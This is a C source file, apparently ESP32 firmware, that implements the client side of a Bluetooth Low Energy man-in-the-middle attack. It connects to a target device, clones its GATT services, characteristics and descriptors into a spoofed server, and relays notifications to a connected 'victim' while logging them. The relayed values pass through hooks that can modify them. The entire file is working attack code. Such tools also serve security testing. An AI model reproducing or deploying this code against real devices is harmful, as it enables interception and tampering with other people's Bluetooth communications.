#include "gatt_internal.h"

/**
 * client_event
 *
 * Handles the GATT Client
 * events. This is our fake
 * connection to the target
 * device that discovers the
 * services, clones them, and
 * then start the GATT Server.
 *
 * The connection tries to stay
 * open for a number of attempts
 * to and actions as a MITM device.
 *
 * @param esp_gattc_cb_event_t event
 * @param esp_gatt_if_t gattc_if
 * @param esp_ble_gattc_cb_param_t *param
 */
void client_event(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if,
                  esp_ble_gattc_cb_param_t *param) {
  if (shutdown_gatt_attack) return;
  switch (event) {
    case ESP_GATTC_REG_EVT: {
      /**
       * After our attacking
       * client is created we
       * need to set our clone
       * interface and begin
       * scanning for our
       * target device.
       */
      clone.gattc_if = gattc_if;
      clone.services = NULL;
      clone.num_services = 0;

      esp_err_t scan_ret = esp_ble_gap_set_scan_params(&ble_scan_params);
      if (scan_ret) {
        ESP_LOGE(TAG, "set scan params error, error code = %x", scan_ret);
      }

      break;
    }
    case ESP_GATTC_CONNECT_EVT: {
      /**
       * Occurs whenever a physical
       * BLE connection is established.
       *
       * It can either be a victim device
       * or the same device connecting back
       * to us in some cases (that might not
       * be handled)
       *
       * We also do a MTU request here.
       */
      ESP_LOGI(TAG, "Connection:");
      esp_log_buffer_hex(TAG, param->connect.remote_bda, sizeof(esp_bd_addr_t));

      if (memcmp(clone.target_bda, param->connect.remote_bda, sizeof(clone.target_bda)) == 0) {
        connected = true;
        connecting = false;
        gatt_send_output("Target Device Client Connected.", false);
        gattAttackState = clone.server_ready ? GATT_ATTACK_STATE_RUNNING
                                     : GATT_ATTACK_STATE_CLIENT_CONNECTED;
        gatt_send_state((int)gattAttackState);
        clone.target_client_conn_id = param->connect.conn_id;

      } else {
        gatt_send_output("Central connected", false);
        clone.victim_client_conn_id = param->connect.conn_id;

      }

      if (param->connect.conn_id == clone.target_client_conn_id) {
        esp_err_t mtu_ret = esp_ble_gattc_send_mtu_req(gattc_if, param->connect.conn_id);
        if (mtu_ret) ESP_LOGE(TAG, "config MTU error, error code = %x", mtu_ret);
      }
      break;
    }
    case ESP_GATTC_DISCONNECT_EVT: {
      /**
       * This event comes when either
       * our victim or attacking client
       * is disconnected.
       *
       * If it is our attacking client
       * we attempt to reconnecting
       * up the the MAX_ATTEMPTS.
       */
      ESP_LOGI(TAG, "GATTC disconnect reason 0x%x (%i) conn_id: %x - "
                    "%02x:%02x:%02x:%02x:%02x:%02x",
              param->disconnect.reason, param->disconnect.reason,
              param->disconnect.conn_id,
              param->disconnect.remote_bda[0], param->disconnect.remote_bda[1],
              param->disconnect.remote_bda[2], param->disconnect.remote_bda[3],
              param->disconnect.remote_bda[4], param->disconnect.remote_bda[5]);

      /**
       * If disconnect is the bda of our
       * upstream device, reconnect
       */
      if (memcmp(clone.target_bda, param->disconnect.remote_bda, 6) == 0) {
        gatt_send_output("Lost Client Connection", false);
        connected = false;
        write_queue_target_disconnected();
        target_transactions_disconnected();
        write_queue_reset();
        finish_pending_write(ESP_GATT_ERROR);

        if (retries < MAX_RETRIES) {
          if (!shutdown_gatt_attack) {
            retries++;
            char out[45];
            sprintf(out, "Target Connect Retry %i/%i", retries, MAX_RETRIES);
            gatt_send_output(out, false);
            esp_ble_gap_set_scan_params(&ble_scan_params);
          }
        } else {
          if (!clone_init) {
            shutdown_gatt_attack = true;
            gatt_send_output("Target connection failed", false);
            gattAttackState = GATT_ATTACK_STATE_CLIENT_CONNECT_FAIL;
            gatt_send_state((int)gattAttackState);
          } else {
            gatt_send_output("Target reconnect exhausted; reads and writes use cache", false);
          }
        }
      } else {
        gatt_send_output("Central disconnected", false);

      }

      break;
    }
    case ESP_GATTC_OPEN_EVT: {
      /**
       * Event comes when a virtual
       * GATT connection is setup.
       *
       * Only used for logging failures
       * atm.
       */
      if (param->open.status != ESP_GATT_OK) {
        ESP_LOGE(TAG, "Open Target connection failed: %d", param->open.status);
        connection_failed("open");
        break;
      }

      break;
    }
    case ESP_GATTC_CFG_MTU_EVT: {
      if (param->cfg_mtu.conn_id != clone.target_client_conn_id) break;
      /**
       * Comes when the clients MTU
       * is set or updated.
       */
      if (param->cfg_mtu.status != ESP_GATT_OK){
        ESP_LOGE(TAG,"config mtu failed, error status = %x", param->cfg_mtu.status);
      }
      ESP_LOGI(TAG, "GATTC MTU status %d, MTU %d, conn_id %d",
               param->cfg_mtu.status, param->cfg_mtu.mtu, param->cfg_mtu.conn_id);
      clone.target_gattc_mtu = param->cfg_mtu.mtu;
      break;
    }
    case ESP_GATTC_DIS_SRVC_CMPL_EVT: {
      if (param->dis_srvc_cmpl.conn_id != clone.target_client_conn_id) break;
      /**
       * Event comes after the connected
       * attacking client has finished
       * discovering the services on the
       * target device.
       *
       * We call esp_ble_gattc_search_service
       * and gather the actual services in the
       * ESP_GATTC_SEARCH_RES_EVT.
       */
      if (param->dis_srvc_cmpl.status != ESP_GATT_OK) {
        ESP_LOGE(TAG, "discover service failed, status %d", param->dis_srvc_cmpl.status);
        break;
      }
      clone.verified_services = 0;
      clone.database_changed = false;
      gatt_send_output("Discover Services Complete!", false);
      esp_ble_gattc_search_service(gattc_if, param->dis_srvc_cmpl.conn_id, NULL);
      break;
    }
    case ESP_GATTC_SEARCH_RES_EVT: {
      if (param->search_res.conn_id != clone.target_client_conn_id) break;
      if (clone_init) {
        clone_verify_service(gattc_if, param);
        break;
      }
      /**
       * This event comes after the
       * Service Discovery is completed.
       *
       * Here is where we actually clone
       * all services, chars, and descriptors
       * to our clone struct.
       */
      if (!clone_init) {
        //ESP_LOGI(TAG, "Service UUID: %x", param->search_res.srvc_id.uuid.uuid.uuid16);

        uint8_t handles = param->search_res.end_handle - param->search_res.start_handle;

        if (last_end_handle) {
          handles += (param->search_res.start_handle - last_end_handle);
        }

        last_end_handle = param->search_res.end_handle;

        service_t service1 = {0};
        service1.service_uuid = param->search_res.srvc_id.uuid;
        service1.service_handle = param->search_res.srvc_id.inst_id;
        service1.start_handle = param->search_res.start_handle;
        service1.end_handle = param->search_res.end_handle;
        service1.num_handles = handles;

        if (!add_service(&service1)) break;
        service_num = clone.num_services - 1;

        uint16_t count = 0;
        esp_gatt_status_t status = esp_ble_gattc_get_attr_count(gattc_if,
                                                                param->search_res.conn_id,
                                                                ESP_GATT_DB_CHARACTERISTIC,
                                                                param->search_res.start_handle,
                                                                param->search_res.end_handle,
                                                                0,
                                                                &count);
        if (status != ESP_GATT_OK) {
          ESP_LOGE(TAG, "esp_ble_gattc_get_attr_count error");
          break;
        }

        if (count > 0) {
          esp_gattc_char_elem_t *char_result =
              malloc(sizeof(esp_gattc_char_elem_t) * count);
          if (!char_result) {
            ESP_LOGE(TAG, "gattc no mem");
            break;
          } else {
            status = esp_ble_gattc_get_all_char(gattc_if,
                                                param->search_res.conn_id,
                                                param->search_res.start_handle,
                                                param->search_res.end_handle,
                                                char_result,
                                                &count, 0);
            if (status != ESP_GATT_OK) {
              ESP_LOGE(TAG, "esp_ble_gattc_get_all_char %s", esp_err_to_name(status));
              free(char_result);
              break;
            }

            for (int i = 0; i < count; i++) {
              /*
              ESP_LOGI(TAG, "Char UUID: %x (%x)",
                      char_result[i].uuid.uuid.uuid16,
                      char_result[i].char_handle);
              */
              char_t char1 = {
                .char_uuid = char_result[i].uuid,
                .char_handle = char_result[i].char_handle,
                .property = char_result[i].properties,
                .descs = NULL,
                .num_descs = 0,
              };

              if (!add_characteristic(&clone.services[service_num], &char1)) break;

              uint16_t desc_count = 0;
              status = esp_ble_gattc_get_attr_count(gattc_if,
                                                    param->search_res.conn_id,
                                                    ESP_GATT_DB_DESCRIPTOR,
                                                    0,
                                                    0,
                                                    char_result[i].char_handle,
                                                    &desc_count);
              if (status != ESP_GATT_OK) {
                ESP_LOGE(TAG, "esp_ble_gattc_get_attr_count(DESCRIPTOR) error");
              }

              if (status == ESP_GATT_OK && desc_count > 0) {
                esp_gattc_descr_elem_t *descr_result =
                    calloc(desc_count, sizeof(esp_gattc_descr_elem_t));
                if (!descr_result) break;
                status = esp_ble_gattc_get_all_descr(gattc_if,
                                                    param->search_res.conn_id,
                                                    char_result[i].char_handle,
                                                    descr_result,
                                                    &desc_count, 0);
                if (status != ESP_GATT_OK) {
                  ESP_LOGE(TAG, "%s", esp_err_to_name(status));
                  ESP_LOGE(TAG, "esp_ble_gattc_get_all_descr error");
                  free(descr_result);
                  break;
                }

                if (desc_count > 0) {
                  for (int x = 0; x < desc_count; x++) {
                    /**
                    ESP_LOGI(TAG, "   Desc UUID: %x (%x)",
                            descr_result[x].uuid.uuid.uuid16,
                            descr_result[x].handle);
                    */
                    desc_t desc1 = {
                      .desc_uuid = descr_result[x].uuid,
                      .desc_handle = descr_result[x].handle,
                      .value = {.attr_max_len = 0x36},
                      .perm = 0
                    };

                    add_descriptor(&clone.services[service_num].chars[i], &desc1);
                  }
                }
                free(descr_result);
              }
            }
            free(char_result);
          }
        }

        service_num += 1;
      }
      break;
    }
    case ESP_GATTC_SEARCH_CMPL_EVT: {
      if (param->search_cmpl.conn_id != clone.target_client_conn_id) break;
      /**
       * This event after we have cloned
       * all the services and are ready
       * to intialized our spoofed GATT
       * Server using these clones.
       *
       * This starts the GATT Server
       */
      if (param->search_cmpl.status != ESP_GATT_OK) {
        ESP_LOGE(TAG, "search service failed, error status = %x", param->search_cmpl.status);
        break;
      }


      if (clone_init) {
        clone_verify_complete();
        break;
      }

      if (clone.gatts_if != ESP_GATT_IF_NONE) {
        clone_init = true;
        clone_create_services();
        break;
      }
      clone_init = true;
      clone.target_client_conn_id = param->search_cmpl.conn_id;

      esp_err_t ret = esp_ble_gatts_register_callback(server_event);
      if (ret){
        ESP_LOGE(TAG, "gatts register error, error code = %x", ret);
        return;
      }

      ret = esp_ble_gatts_app_register(0);
      if (ret){
        ESP_LOGE(TAG, "gatts app register error, error code = %x", ret);
        return;
      }

      gatt_send_output("GATT Server starting", false);
      break;
    }
    case ESP_GATTC_REG_FOR_NOTIFY_EVT: {
      /**
       * This event comes after a victim
       * client has wrote a descriptor
       * to turn on notifications for a
       * handle and we set our attacking
       * client to notify on the same
       * handle.
       */
      if (param->reg_for_notify.status != ESP_GATT_OK){
        ESP_LOGE(TAG, "REG FOR NOTIFY failed: error status = %d", param->reg_for_notify.status);
        break;
      }

      gatt_send_output("Client register notify success", false);
      // Local notification registration is not completion of the remote
      // CCCD write; its response arrives in ESP_GATTC_WRITE_DESCR_EVT.
      break;
    }
    case ESP_GATTC_NOTIFY_EVT: {
      if (clone.refresh_pending ||
          param->notify.conn_id != clone.target_client_conn_id) break;
      bool central_connected = uart_bridge_phone_connected();
      /**
       * This event comes when our
       * attacking client has received
       * a notify event.
       *
       * Here we run hooks if needed,
       * log the information and pass
       * it back to our victim.
       */
      char uuid[38] = {0};
      uint16_t notify_len = param->notify.value_len;
      if (notify_len > ESP_GATT_MAX_ATTR_LEN) break;
      uint8_t *notify_value = (uint8_t*)malloc(notify_len ? notify_len : 1);
      if (!notify_value) break;
      if (notify_len) memcpy(notify_value, param->notify.value, notify_len);

      char* hex_value = bytes_to_hex_string(param->notify.value, param->notify.value_len);
      get_uuid_for_handle(param->notify.handle, uuid);

      apply_hook("notify", uuid, &hex_value, &notify_value, &notify_len);

      log_and_send_json(
        param->notify.is_notify ? "NOTIFY" : "INDICATE",
        central_connected ? "target -> central" : "target -> proxy",
        "",
        gattc_if,
        param->notify.conn_id,
        0,
        param->notify.handle,
        0,
        uuid,
        hex_value ? hex_value : ""
      );

      free(hex_value);

      if (central_connected) esp_ble_gatts_send_indicate(clone.gatts_if,
                                  clone.victim_client_conn_id,
                                  param->notify.handle,
                                  notify_len,
                                  notify_value,
                                  !param->notify.is_notify);
      free(notify_value);
      break;
    }
    case ESP_GATTC_WRITE_DESCR_EVT: {
      write_queue_complete(true, param);
      break;
    }
    case ESP_GATTC_WRITE_CHAR_EVT: {
      write_queue_complete(false, param);
      break;
    }
    case ESP_GATTC_CONGEST_EVT:
      write_queue_resume(param->congest.conn_id, param->congest.congested);
      break;
    case ESP_GATTC_QUEUE_FULL_EVT:
      write_queue_resume(param->queue_full.conn_id, param->queue_full.is_full);
      break;
    case ESP_GATTC_PREP_WRITE_EVT: {
      finish_prepare(param);
      break;
    }
    case ESP_GATTC_EXEC_EVT: {
      finish_execute(param);
      break;
    }
    case ESP_GATTC_READ_CHAR_EVT: {
      finish_read(false, param);
      break;
    }
    case ESP_GATTC_READ_DESCR_EVT: {
      finish_read(true, param);
      break;
    }
    case ESP_GATTC_SRVC_CHG_EVT: {
      /**
       * This event comes when the
       * remote target device has
       * changed its BDA (Mac) addres.
       */
      esp_bd_addr_t bda;
      memcpy(bda, param->srvc_chg.remote_bda, sizeof(esp_bd_addr_t));
      ESP_LOGI(TAG, "ESP_GATTC_SRVC_CHG_EVT, bd_addr:");
      esp_log_buffer_hex(TAG, bda, sizeof(esp_bd_addr_t));
      break;
    }
    default:
      break;
  }
}
